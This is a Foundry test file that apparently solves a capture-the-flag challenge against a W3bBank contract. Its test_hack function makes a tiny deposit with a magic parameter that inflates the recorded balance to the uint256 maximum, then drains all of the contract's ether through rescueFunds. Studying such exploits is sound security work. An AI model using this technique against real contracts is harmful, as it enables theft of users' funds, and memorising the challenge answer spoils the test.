// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test} from "forge-std/Test.sol";
import {W3bBank} from "../src/W3bBank.sol";

contract W3bBankTest is Test {
    W3bBank public bank;
    address owner = makeAddr("owner");
    address alice = makeAddr("alice");

    function setUp() public {
        deal(owner, 1 ether);
        vm.prank(owner);
        bank = new W3bBank{value:1 ether}();
    }


     // you're only permitted to prank alice
    function test_hack()public{
        deal(alice, 1 ether);
        
        vm.startPrank(alice);

        bank.deposit{value: 1}(alice, 16859);

        assertEq(bank.viewDeposit(alice), type(uint256).max);

        bank.rescueFunds();
        vm.stopPrank();

     
        assertGe(alice.balance, 2 ether);
        assertEq(address(bank).balance, 0);
        
        // vm.startPrank(alice);
        // deal(alice, 1 ether);
        // bank.deposit{value: 1 ether}(alice, 0);
        // bank.rescueFunds();
    }

    // function testWithdraw() public {
    //     deal(alice, 1);
    //     uint256 amount =  bank.viewDeposit(owner);
    //     vm.startPrank(alice);
    //     bank.deposit{value: 1}(alice, 20000);
    //     bank.rescueFunds();

    //     vm.stopPrank();

        
    //     // vm.startPrank(alice);
    //     // deal(alice, 1 ether);
    //     // bank.deposit{value: 1 ether}(alice, 0);
    //     // bank.rescueFunds();


    //     assertEq(alice.balance, 1000000000000000001);
    //     assertEq(address(bank).balance, 0);

        
    // }

    

    // function testFuzz_SetNumber(uint256 x) public {
    //     counter.setNumber(x);
    //     assertEq(counter.number(), x);
    // }
}